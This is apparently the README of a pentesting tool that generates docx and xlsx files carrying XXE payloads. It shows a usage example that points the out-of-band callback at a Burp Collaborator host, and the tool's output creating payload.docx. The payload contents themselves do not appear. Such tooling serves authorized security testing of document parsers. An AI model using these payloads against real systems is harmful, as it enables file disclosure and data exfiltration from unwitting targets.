# OpenXML-XXE-Generator
A small bash script to automate the generation of docx and xlsx XXE payloads.

## Usage
1. The first argument must be either Docx or Xlsx - case sensitive
2. The second argument is the location you'd like to receive an OOB hit to. Usually a burp collaborator server

```
╰─○ ./gen.sh Docx http://vutfzqoyrwfkhrqnlt0eeth0iromcb.burpcollaborator.net
[+] Created tmp folder - /tmp/tmp.DkjNdfWwOf
[+] Copying files to tmp folder
[+] Replacing vars
[+] Creating document
  adding: tmp/tmp.DkjNdfWwOf/Docx/_rels/.rels (deflated 54%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/settings.xml (deflated 62%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/_rels/document.xml.rels (deflated 65%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/styles.xml (deflated 90%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/theme/theme1.xml (deflated 79%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/fontTable.xml (deflated 65%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/document.xml (deflated 71%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/word/webSettings.xml (deflated 50%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/[Content_Types].xml (deflated 69%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/docProps/app.xml (deflated 45%)
  adding: tmp/tmp.DkjNdfWwOf/Docx/docProps/core.xml (deflated 46%)
[+] Document created at /tmp/tmp.DkjNdfWwOf/payload.docx
```
